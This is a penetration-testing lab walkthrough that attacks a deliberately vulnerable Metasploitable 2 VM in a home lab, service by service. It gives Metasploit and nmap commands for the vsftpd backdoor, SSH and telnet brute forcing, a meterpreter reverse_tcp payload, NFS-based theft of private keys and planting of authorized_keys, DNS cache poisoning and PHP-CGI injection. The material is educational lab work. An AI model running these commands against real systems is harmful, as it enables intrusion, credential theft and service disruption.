# Server Side Attacks: 
These are the type of attacks which is used to gained unauthorized acess to the system by exploiting the vulnerabilites or misconfiguration of the Software, OS and the services running on the target machine. 

These attacks do not require any user/client interaction as it mainly focus on vulnerabilites present in the target system. For these type of attacks the target should have on the same network or may have a public ip like servers i.e the target should be reachable from the target machine(Not hidden behind the routers). If the target is not reachable then these type of attacks are failed, For that case try using **client side attacks**.

## Server Side Attacks includes:
**Target Misconfigurations and Existing Vulnerabilities**: Poor configurations (e.g., weak passwords, default settings) and not up to date software/services (e.g Exisiting vulnerabities and backdoors) making it easier for attackers to compromise the system by bruteforcing or using existing exploits.

  **Injection Flaws** (e.g., SQL Injection): In this, Attacker sends malicious code to interact with a database, leading to data theft or manipulation.
  
  **Remote Code Execution** (e.g Service containg a backdoor ): Exploiting these flaws allows the attacker to execute system command remotely.
  
  **Insecure File Upload**: Uploading malicious files that execute code or provide a foothold on the target server/machine.
  
  

---
# Exploiting the Various Vulerabilities of **Metasploitable 2** Machine :

Metasploitable 2 is a deliberately vulnerable virtual machine used for practicing penetration testing techniques. In this guide I will demonstrate how to exploit the various vulnerabilities of the Metasploitable 2 Machine using my Kali Linux Machine. So lets get started

## Tools Used :
### 1. **Nmap** (Network Mapper)
Nmap is an open-source tool used for network discovery and security auditing. It is widely used to **scan and map networks**, **identify open ports**, **services running on different port**, **Operating system detection** and **discover vulnerabilities**.

The main problem with this tools is that it is **quite noisy** i.e It can easily detected by the IDS and IPS software and by setting certain rules they can block the nmap scan. But by using different scanning techinques like **Inverse tcp flag Scanning**,**Decoys** and Specifing **Timing Templates** etc can bypass the IDS and IPS rules.

***Some key features include***:
1. **Port Scanning**: Identifies open and closed ports on a network or particular machine.
2. **Service Version Detection**: Determines the version of services running on open ports(like, FTP, SSH).
3. **OS Detection**: Detects the operating system of the target machine.
4. **Scripting Engine**: Nmap also contains the **NSE** nmap scripting Engine that is used to Automates tasks using scripts, such as vulnerability detection, bruteforcing etc. The nmap scripts are present in the /usr/share/nmap/scripts/ directory.
### Nmap is very essential tool for reconnaissance(mainly active scanning)  in penetration testing.
---
  
### 2. **Metasploit Framework**
Metasploit is an open-source penetration testing platform that allows cybersecurity professionals to **find**,**assist** **exploit**, and **validate** different type of vulnerabilities. It contains a vast database of **exploits**, **payloads**, **encoders** and **auxilaries** for different platforms and services. ***Key features include***:

1. **Exploits Database**: A wide collection of exploits for different software vulnerabilities.
2. **Payloads**: A small piece of code that gets executed on the target once the vulnerability is exploited.
3. **Post-Exploitation**: Allows further actions like privilege escalation and data extraction after compromising a system.
4. **Auxiliary Module**: Tools for auxiliary functions like scanning, fingerprinting ,fuzzing, or DoS attacks.

 #### Metasploit helps streamline the exploitation process, making it a go-to tool for vulnerability assessments and Exploitation.

 ---
 ### 3. Hydra
 ### 4. Openvas
# Step 1 Enummeration or Reconnasissance

This is the first step in the penetration testing also known as Information Gathering step. In this step Gather as much information as you can about the target. It includes find ip addresses, public information about the target, Target OS, various services running on target, open port, its domain and subdomain etc. This phase is very crucial to further carry out in both server side and client side attack.
It was categorised in two categories:

**1. Passive Scanning**: In passive scanning we gather information about the target that is publically available i.e with interacting with the target like the target domain, its subdomain, technology stack etc.

**2. Active Scanning**: In Active scanning we gather information by direclty interacting with the target using tools like nmap to scan for open ports, its running services and its versions etc.

## Lets start by Gathering information about our target Metasploitable 2:
**As we Know that the target is our local machine in our virtual homelab environment So there is not much public information available about our target. So we skip the passive reconn step and move to the Active Scanning**

**Step I** Now first as we know that the target machine is inside our homelab network but we don't know the ip address of the target.So firstly start with a Hostscan with nmap over entire network to get the ip address of our target Metasploitable 
```
nmap -sn 192.168.1.100/24
```
Output:
![](../images/nmap_hostscan_on_entire_network.png)
As from the above result we get that our network has 
192.168.1.100 -> opnsense firewall address

192.168.1.101 -> kali machine

then there is **192.168.1.103** -> which is our metasploitable machine

**Step II** Verrfy that Our client is reachable 
From our Attacker kali machine try to ping our metasploitable machine
```
ping 192.168.1.103
```
**Step III** As the Host is up and reachable, let do an nmap scan to identify the open ports and its running service along with version detection.
```
nmap -Pn -sV -v 192.168.1.103
```
Pn -> for Directly perform Port scanning as we already verify the host is up and running.

sV -> For service detection along with its version.

v  -> For verbose i.e detail about each step.
**Output**:
![](../images/nmap_port_scan_on_target.png)

---
# Step 2 Identifying Vulnerabilites and Exploit them
In this phase different running services are analyzed against the common vulnerabilites scanning scripts and try to exploit them using diffent exploits and payloads available in the metasploit framework. Generally we start check for vulnerabilities for common port like 80, 512 etc. but as I targeted our own vulnerable machine lets start for each port one by one.

## 1. Exploiting Service on port 21:ftp-> Vsftpd 2.3.4
As from the nmap scan we got that an ftp service is running on port 21 along with its version -> vsftpd 2.3.4.

Vsftpd(very secure file transfer protocol deamon) is a ftp service used to share files and resources more securely with the server. 



### Identifying Vulnerabilities or Weakness:
```
cd /usr/share/nmap/scripts
#Search for ftp related scripts
ls -al | grep "ftp"
#check for anonymous login allowed or not
nmap -p 21 --script ftp-anon.nse 192.168.1.103
#check for the common backdoor present in vsftp or not
nmap -p 21 --script ftp-vsftpd-backdoor.nse 192.168.1.103
```
**Output**
![](../images/checking_for_anonymous_login_in_vsftpd.png)
![](../images/checking_for_vsftpd_backdoor_via_nse_scripts.png)
From the output we can conclude that there are 2 main vulnerability present in the **vsftpd-2.3.4**:

**1. Anonymous login allowed without password.**
**2. A Backdoor Command Execution Vulenability.**

### Exploitation :

**1. Exploiting Anonymous login allowed vulnerability**: This vulnerability allowed to login as anonymous without providing the password to the ftp server of the metasploitable machine.

  For this we just need to have a ftp client that need to connect to the ftp server, you can use the linux **inbuild ftp client** or **filezila**. 
  
  **Using Filezila**:
  
  **Step I**: Open Filezila and put the **host= Metasploitable ip i.e 192.168.1.103** & **username= anonymous** & **password= (left blank)**
  
  **Step II**: Start a quick scan and you get connected to the vsftpd server.
 ![](../images/anonymous_login_via_filezila.png) 
  
  **Using linux ftp-client**:Enter the terminal and run ftp-client by:
  ```
ftp 192.168.1.103
username=anonymous
password=
```
**Output**
![](../images/anonymous_login_via_ftp_client.png)

**Now we have successfully gained access to the ftp server of our target which has misconfigured ftp service. But with the ftp server of metasploit we can't perform that much shell operation as its limited scope of transfering files to the server only**.

**2. Exploiting Backdoor commmand Execution Vulnerability**: This version of vsftp-2.3.4 has a inbuild backdoor present in its source code which allows as to execute full system command once we got successfully connected to that backdoor.

1. Firstly search for the exploit available for this vulnerability, by searching **vsftpd-2.3.4 exploit** on google or any search engine.
2. From that we got to know that there is metasploit exploit module that can be used to connect to this backdoor.
3. Now exploit this vulnerability using metasploit vsftp exploit as:
```
#Run the metasploit framework cli using cmd
msfconsole
#search vsftpd backdoor command execution exploit
msf > search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
#check for fields
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options
#Set field according to our target
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.103
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
#Run the exploit
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```
![](../images/exploiting_vsftpd_backdoor_using_metasploit_1.png)
![](../images/exploiting_vsftpd_backdoor_using_metasploit_2.png)
![](../images/exploiting_vsftpd_backdoor_using_metasploit_3.png)

**After running the exploit, a shell session is estabilise with the target machine and you execute any linux command on the target machine.**
#To get the above script -> ! [here]()


---
## Exploiting Service on Port 22: ssh service(secure shell) Openssh-4.7p1
![](../images/services_on_port_22.png)
### Identifying Vulnerabilites or Weakness
 ```
cd /usr/share/nmap/scripts
ls -al | grep ssh
#Check for ssh authentication methods
nmap -p 22 --scripts ssh-auth-methods.nse 192.168.1.103
#check for algorithm used
nmap -p 22 --scripts ssh2-enum-algo.nse 192.168.1.103
```
**Output**
![](../images/scanning_with_nse_scripts_against_ssh.png)
![](../images/scanning_with_nse_scripts_against_ssh_2.png)
From the output we get that the target machine uses both password and private key based authentication. Also we get info about the algorithm used by the ssh-server like rsa,dss which are quite weak and outdated encryption algorithms.But We can conclude a direct vulnerability from here. Now search for vulnerability in this ssh version(Openssh-4.7p1) on internet, search openssh-4.7 exploit, here we found that it has a **user code execution vulnerability** which allow us to execute command on the remote server after getting an ssh connection with the target server and its corresponding exploit is present in the metasploit exploit db module.

### Exploitation:
As we don't have the direct vulneabilty in this ssh version, To exploit/attack this ssh service i.e to get the ssh connection to the target we have two methods:

1. **Bruteforcing the ssh with username and passwords.**
2. **Using key based authentication.**

#### 1. Bruteforcing the ssh with username and passwords**:
**--> Using /auxiliary/scanner/ssh/ssh_login** module
 As we know the target ssh services allows password based authentication. So we can bruteforce the login attemps using a wordlist. For this we have an auxiliary module in the metasploit framework. Let start the attack
 ```
#Start the metasploit cli
msfconsole
#search for the auxiliary module
msf > search ssh_login
msf auxiliary(scanner/ssh/ssh_login) > use auxiliary/scanner/ssh/ssh_login
#check for the fields
msf auxiliary(scanner/ssh/ssh_login) > show options
set RHOST 192.168.1.103
#setting the userpass custom wordlist of metasploit
msf auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlist/userpass.txt
msf auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCESS true
msf auxiliary(scanner/ssh/ssh_login) > set USER_AS_PASSWORD true
msf auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
msf auxiliary(scanner/ssh/ssh_login) > exploit
```
Now this module will brute force the ssh login with the wordlist and if there is a match we get the username and password for that ssh server.We get them easily, if it has default crudential or weak password. If this doesn't get the result parameter create your custom wordlist as per you target info and use them.
**Output**
![](../images/exploiting_ssh_using_bruteforce_1.png)
![](../images/exploiting_ssh_using_bruteforce_2.png)
![](../images/exploiting_ssh_using_bruteforce_3.png)
![](../images/ssh_bruteforce_wordlist.png)
![](../images/exploiting_ssh_using_bruteforce_4.png)
In my case I am using metasploitable with default login crudential,that why get the result as **username= msfadmin** and **password= msfadmin**.

From here, one way is we have ssh-crudentials and using them we can connect to the target via any ssh-client but using this we had to manually perform command for each task injecting payload and other post exploitation stuff. So automate the command execution task and integrate the ssh connection with metasploit framework we are using the **sshexec** module of metasploit framework for connecting via ssh.It makes running **custom payloads**, **privilege escalation**, and **post-exploitation** tasks easier and more structured.

```
msfconsole
msf > search multi/ssh/sshexec
msf > use exploit/multi/ssh/sshexec
msf exploit(multi/ssh/sshexec) > options
#set the payload options to a 32-bit payload as our target metasploitable is 32-bit vm
msf exploit(multi/ssh/sshexec) > set payload linux/x86/meterpreter/reverse_tcp
msf exploit(multi/ssh/sshexec) > show targets
#set the target to x86(as this payload is compatible to 32-bit target)
msf exploit(multi/ssh/sshexec) > set target 1
#set the target ip, username and password we get from bruteforcing
msf exploit(multi/ssh/sshexec) > set RHOSTS 192.168.1.103
msf exploit(multi/ssh/sshexec) > set USERNAME msfadmin
msf exploit(multi/ssh/sshexec) > set PASSWORD msfadmin
#verify the options field
msf exploit(multi/ssh/sshexec) > show options
#run the exploit
msf exploit(multi/ssh/sshexec) > exploit
```
**Output**
![](../images/automation_and_for_post_exploitation_1.png)
![](../images/automation_and_for_post_exploitation_2.png)
![](../images/automation_and_for_post_exploitation_3.png)
![](../images/automation_and_for_post_exploitation_4.png)
![](../images/automation_and_for_post_exploitation_5.png)

#### 2. Private ssh-Key based Authentication**:
**--> Using auxiliary/scanner/ssh/ssh_login_pubkey**
In this attack we are going to Sniff the target private key and try to gain access using them. 

With that private key we are not only able to access the target machine, but also we can access all the remote server that trust the target client key.

**(Note that we could also plant your own ssh public keys on the target, by adding them into the target machine's .ssh/authorized_keys file, but this technique would allow you to only access the target metasploitable machine, wile the above method provide access to not only the metasploitabe machine but also the remote machine/server which trust the target private key.)**

##### Obtaining target Private keys:
For this attack to carry on and to get the private key of target, **We need to have access to the target file system along with read and write permissions**. In this case, our metasploitable machine is configure to provide **NFS(network file system) server on port 2096** that allows any devices in the network can mount the **'/' file system** of metasploitable machien along with **read and write permission** which is a very bad configuration. So by using NFS we can mount metasploitable '/' directory to our attacker machines. Here we go:
```
#for this we have the nfs-client and rpcbind service package should be insalled
#Check for what filesystem is mountable
showmount -e 192.168.1.103
#Start the rpcbind services
service rpcbind start
#choose a directory where to mount the target filesystem, I choose a new target directory in the tmp folder
mkdir /tmp/target
mount -t nfs 192.168.1.103:/ /tmp/target
#copy the target public key to its authorized_keys
cat /tmp/target/home/msfadmin/.ssh/id_rsa.pub >> /tmp/target/home/msfadmin/.ssh/authorized_keys
#we can also plant our own public key to target authorized_keys ***(alternate)***
#cp /home/kali/.ssh/id_rsa.pub /tmp/target/home/msfadmin/.ssh/autherized_keys/
#Sniff the target private key as target_id_rsa
cp /tmp/target/home/msfadmin/.ssh/id_rsa /home/kali/target_rsa_idd
#Unmount the file system
umount /tmp/target

```
**Output**
![](../images/nfs_service_on_port_2049.png)
![](../images/mounting_target_file_system.png)

Now we have placed target machine's public key into its authorized keys of the target and sniffed its private key. We can simply connect to the target using ssh-client with the target private key, but here I am using ssh_login_pubkey auxiliary of the metasploit frameowork because it automate the task of authentication if we have **multiple private keys** and didn't know which key is used to authenticate with the target, or we have **multiple targets** or we have **multiple users and key pair**, In that case we use this modules to automatically trying to authenticate with username and keys-pairs instead of manually checking.
```
#if current user don't have permission with sniffed private key file then,
sudo chown kali target_rsa_idd
sudo chmod 600 target_rsa_idd
```

```
msfconsole
msf> search ssh_login_pubkey
msf> use auxiliary/scanner/ssh/ssh_login_pubkey
#setting the required field 
msf  auxiliary(ssh_login_pubkey) > options
msf  auxiliary(ssh_login_pubkey) > set RHOSTS 192.168.1.103
#Must ensure that that the key file has right(read,write) permission to current user
msf  auxiliary(ssh_login_pubkey) > set KEY_FILE /home/kali/target_id_rsa
msf auxiliary(ssh_login_pubkey) > set USERNAME msfadmin
msf auxiliary(ssh_login_pubkey) > exploit

```
**Output**
![](../images/changing_ownership_and_permission_of_sniffed_key_file.png)
![](../images/ssh_exploitation_using_target_private_key_1.png) 
![](../images/ssh_exploitation_using_target_private_key_2.png) 
![](../images/ssh_exploitation_using_target_private_key_3.png) 
![](../images/ssh_exploitation_using_target_private_key_4.png) 
![](../images/ssh_exploitation_using_target_private_key_5.png) 

---

## Exploiting Service on Port 23: telnetd service
Since telnet(teletype network protocol) is also a remote access protocol like ssh, i.e using telnet we can access and share the server and its resources remotely. It operates on TCP/IP protocol. But telnet does not implement any encryption of data while sharing of data and resources. So it vulerable to MITM and eavesdroping attacks and nowdays it is replaced by more secure protocol like ssh.

![](../images/service_on_port_23.png)
### Identifying Vulnerabilites or Weakness
 1. The main vulnerability or we can say weakness in the telnet protocol was it is prone to **MITM and eavesdroping attack**(i.e if the attacker is able to interfare the communication(estabilise itself as MITM) , it can direcly sees what is being shared/exchanged because there is no encryption. But I am not going to exploit it with MITM.
 ```
cd /usr/share/nmap/scripts
ls -al | grep telnet
#Check for telnet encryption methods
nmap -p 23 --scripts telnet_encryption.nse 192.168.1.103
```
 ![](../images/running_nse-scripts_for_telnet.png)
As by running NSE script we got that the telnet is not using any encryption
 
2. As it is a remote access protocol, it uses user-password authentication to establise a connection with the server like the ssh protocol. So we can do **bruteforce to get the username and password** to authenticate wtih the target.

 ### Exploitation
In order to exploit the telnet service we are **Using bruteforce method** to get the username and password to authenticate with the target.
### Bruteforcing the telnet service for username and password
```
msfconsole
msf > search telnet_login
msf > use /auxiliary/scanner/telnet/telnet_login
msf auxiliary(scanner/telnet/telnet_login) > options
msf auxiliary(scanner/telnet/telnet_login) > set RHOSTS 192.168.1.103
msf auxiliary(scanner/telnet/telnet_login) > set PASS_FILE /home/kali/test_bruteforce.txt
msf auxiliary(scanner/telnet/telnet_login) > set USER_FILE /home/kali/test_bruteforce.txt
msf auxiliary(scanner/telnet/telnet_login) > set STOP_ON_SUCCESS true
msf auxiliary(scanner/telnet/telnet_login) > set VERBOSE true
msf auxiliary(scanner/telnet/telnet_login) > exploit
```
Output:

![](../images/telnet_exploitation_using_bruteforce_1.png)
![](../images/telnet_exploitation_using_bruteforce_2.png)
![](../images/telnet_exploitation_using_bruteforce_3.png)
![](../images/telnet_exploitation_using_bruteforce_4.png)
Now we get the username and password by bruteforcing with the username and password wordlist. Also the auxiliary estabilise a session with the target where we can execute system command on the target machine.

---
## Exploiting Service on Port 25: Postfix Smtpd service
Simple Mail Transfer Protocol (SMTP) is the standard protocol for sending emails across the internet. It operates on port 25 by default (and optionally on port 587 or 465 for secure transmission) and uses a client-server model. SMTP is responsible for transferring email messages from an any email client (outlook,gmail,apple-mail etc) to the reciever Mail server. Nowdays it is encrypted using SSL/TLS to protoct the email-data

![](../images/service_on_port_25.png)
### Identifying Vulnerabilites or Weakness
 ```
cd /usr/share/nmap/scripts
ls -al | grep smtp
#Check for vulnerabilities by running all scripts
nmap -p 25 --scripts "smtp-*" 192.168.1.103
```
Output:

![](../images/running_nse-script_for_smtp.png)
By running various NSE script we can't find a well known vulnerability in this smtp protocol.
By futher searching we find that we had a enummeration module in the metasploit framework which **identifies the user's** in the smtpd service by bruteforcing request with a wordlist.

### Exploitation
We can't find a well known vulnerability in the smtpd service to exploit but there is flaw that allow as to enumerate the smtp user's using the smtpd service on the target machine.
```
msfconsole
msf > search smtp_enum
msf > use auxiliary/scanner/smtp/smtp_enum
msf auxiliary(scanner/smtp/smtp_enum) > options
msf auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 192.168.1.103
msf auxiliary(scanner/smtp/smtp_enum) > exploit
```
output:
![](../images/smtp_users_enum_exploitation.png)
![](../images/smtp_users_enum_exploitation_2.png)
![](../images/smtp_users_enum_exploitation_3.png)
From the output we can conclude that we have identified different user on the target that are using smtpd service.

---

## Exploiting Service on Port 53: Domain-> ISC BIND 9.4.2
ISC BIND is the most commonly used domain services in the linux based system. It mainly used to resolve the domain name into the ip address, so that we can access that website/server over the internet.
![](../images/service_on_port_53.png)

### Identifying Vulnerabilites or Weakness
Here we I am using vulners script to search for vulnerability in the ISC bind service. I find quiet lots of vulnerabilities correspond to this services but most of them are DOS(Denial of Service) and DNS spoofing attack. 
![](../images/vulnerabilites_in_domain_service.png)
I also search on google, vulners.com and CVE details to verify these vulerabilities(always prefered). Through My reasearch of exploiting the vulnerabilites on domain service, I found the two main vulnerability that I can exploit is-

**1.DNS Cache Poisoning/DNS Hijacking vulnerability** **CVE-2008-4194/1447**

In this vulnerability, we can send dns responses(poisoning) to the target in order to cache the false dns entry for a specific domain in the target dns server. 
**2.Buffer-Overflow vulnerability** **CVE-2021-25216**
**3.Dos by crashing the Named service** **CVE-2009-0696**

The vulnerability allows an attacker to cause a denial of service (DoS) by sending crafted dynamic update messages to BIND’s named daemon, causing it to crash. In the isc bind service, have a vulnerability in how they process TKEY queries. The vulnerability can be triggered remotely, and sending a single malformed TKEY request can cause a denial of service (DoS) by crashing the **named** service, which handles DNS queries.

The TKEY record (type="TKEY") is used for transaction key management in DNSSEC. BIND 9.4.2 has certain flaws that, incorrectly handles certain TKEY requests, allowing an attacker to craft a request that crashes the service.

### Exploitation
#### 1.Exploitation the DNS cache poisoning vulnerability
For this, on a little search on google I found a metasploit exploit module which can perform the dns poisoning attack for a specific domain/host.
**auxiliary/spoof/dns/bailiwicked_domain**
**auxiliary/spoof/dns/bailiwicked_host**
```
sudo msfconsole
msf > search spoof/dns
msf > use auxiliary/spoof/dns/bailiwicked_domain
msf auxiliary(spoof/dns/bailiwicked_domain) > set RHOSTS 192.168.1.103
#recons is important as it queries to get the dns info about the target domain and helps the dns spoof response appear legitimate to mimicking the real dns-data, so it is set to an open external dns server.
msf auxiliary(spoof/dns/bailiwicked_domain) > set RECONS 199.43.133.53
#The host to which the domain is spoofed with( I am using my attacker machine server)
msf auxiliary(spoof/dns/bailiwicked_domain) > set NEWDNS 192.168.1.101
#Domian which we want to spoof
msf auxiliary(spoof/dns/bailiwicked_domain) > set DOMAIN example.com
#if you don't know the target's response port set it to 0 to check for all ports
msf auxiliary(spoof/dns/bailiwicked_domain) > set SRCPORT 0
msf auxiliary(spoof/dns/bailiwicked_domain) > set SRCADDR Real
#It represent the no of spoofed response sends to the target. It should sent to high so that in race condition with the original dns respose, our spoofed response will win.
msf auxiliary(spoof/dns/bailiwicked_domain) > set XIDS 20000
msf auxiliary(spoof/dns/bailiwicked_domain) > run
```
**Output**
![](../images/exploiting_dns_spoofing_vulnerability_1.png)
![](../images/exploiting_dns_spoofing_vulnerability_2.png)
![](../images/exploiting_dns_spoofing_vulnerability_3.png)
As the attack is good to go, ensure that-
1. The metasploitable machine uses the ISC BIND service to resolve the dns, as the metasploit is connected to LAN interface of opensense, there are chances that it is configure to dns forwarding to the opensense and if so the metaspoitable machine is not using its own ISC bind service and this attack doesn't work. For that you must ensure that there is **nameserver 127.0.0.1** entry in the resolv.conf file.
2. Also check that your opensense firewall is not blocking the fluided dns responses in the network.
3. The dns cache should be cleaned if there any prior entry about our target domain. 
4. At last, the ISC bind is not configured to have DNSSEC enable, if so the target won't accept our spoofed dns responses.
![]()
![]()
As of now I perform the attack multiple time, changing parameters and also analysis the traffic using wireshark but every times the attack fails to spoof the dns entry for that domain. I conclude that there is a DNSSEC is enabled on the example.com domain which takes PRG signature verification before the dns response get accepted, and so my spoofed dns responses got rejected by the target. Hence this attack not worked but I can try It using my own domain having not DNSSEC in future and hope so it works.

#### Exploiting the Tkey-querry handling vulerability
To exploit this vulnerability, we need to craft a malicious Tkey(Transition key)-querry which can cause the named services to crash and the whole goes down as Dos.
The TKEY record (type="TKEY") is used for transaction key management in DNSSEC. BIND 9.4.2 incorrectly handles certain TKEY requests, allowing an attacker to craft a request that crashes the service.
This exploit does not require authentication, making it a remote exploit for denial of service.
For this I crafted a python script to send a malicious Tkey request
[]
```
python script.py
```
--- 

## Exploiting Service on Port 80: Apache httpd 2.2.8 service
The Apache HTTP Server (httpd) is an open-source web server software(Web container). It is one of the most widely used web servers in the world, designed to deliver the web content. It is compatible with mostly all operating systems like Linux, Windows, and macOS, and can serve both static and dynamic web pages. It uses mostly Php as a server side language.
![](../images/service_on_port_80.png)

### Identifying Vulnerabilites or Weakness
By browsing the target ip on the webserver we got, there is an apache server hosting multiple websites. As mostly, apache server uses php as server side language. Lets find which version of php is that target using 
```
cd /usr/share/nmap/scripts
ls -al | grep php-version
nmap -p 80 --script http-php-version.nse 192.168.1.103
```
Ouput:
![](../images/php_version_detection.png)
After running the script we get the php has version-> php 5.2.4

Now I use a **searchsploit** tool which search for existing vulnerabilites in this apache 2.2.8 version
```
searchsploit apache 2.2.8 | grep php
```
Output:
![](../images/searching_vulnerability_on_apache.png)
**1. Cgi-bin Remote code execution Vulnerability**

### Exploitation
#### 1. Exploit cgi-bin Remote code execution Vulnerability in php
```
msfconsole
msf > search php_cgi
msf > use exploit/multi/http/php_cgi_arg_injection
msf exploit(multi/http/php_cgi_arg_injection) > options
#only need to specified the RHOSTS, the Payload is set to default but we can use any custom payload
msf exploit(multi/http/php_cgi_arg_injection) > set RHOSTS 192.168.1.103
msf exploit(multi/http/php_cgi_arg_injection) > options
msf exploit(multi/http/php_cgi_arg_injection) > exploit
```
![](../images/exploitation_using_cgi_arg_injection.png)
![](../images/exploitation_using_cgi_arg_injection_2.png)
![](../images/exploitation_using_cgi_arg_injection_3.png)
![](../images/exploitation_using_cgi_arg_injection_4.png)
After executing the exploit we get a meterpreter session establised with the target using reverse_tcp. Now we can execute any command remotely on the target metasploitable machine.
